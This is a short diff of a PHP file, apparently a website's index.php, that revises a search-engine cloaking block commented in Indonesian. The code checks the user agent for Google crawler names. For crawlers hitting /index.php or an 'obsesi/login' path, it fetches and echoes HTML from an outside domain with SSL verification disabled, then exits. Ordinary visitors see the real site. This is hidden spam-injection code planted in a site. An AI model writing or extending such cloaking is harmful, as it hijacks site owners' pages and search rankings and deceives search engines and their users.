@@ -2,19 +2,30 @@
 function is_google_bot(){
     $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
     foreach($a as $b){
-        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return 1;
+        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return true;
     }
-    return 0;
+    return false;
 }
 
-// JALANKAN HANYA JIKA DI ROOT (bukan di /bisa)
-if($_SERVER['REQUEST_URI'] == '/' || $_SERVER['REQUEST_URI'] == '/index.php'){
+// CEK REQUEST URI PAKAI strpos() BIAR FLEKSIBEL
+$uri = $_SERVER['REQUEST_URI'];
+if(strpos($uri, 'index.php/obsesi/login') !== false || strpos($uri, '/index.php') === 0){
     if(is_google_bot()){
-        $c = curl_init('https://inkaindonesia.org/landing/obsesi-revisi1.html');
-        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
-        echo curl_exec($c);
-        curl_close($c);
+        $url = 'https://inkaindonesia.org/landing/obsesi-revisi1.html';
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        if($http_code == 200){
+            echo $response;
+        } else {
+            // Fallback kalau URL 404
+            echo "Halaman tidak ditemukan (404)";
+        }
         exit;
     }
 }
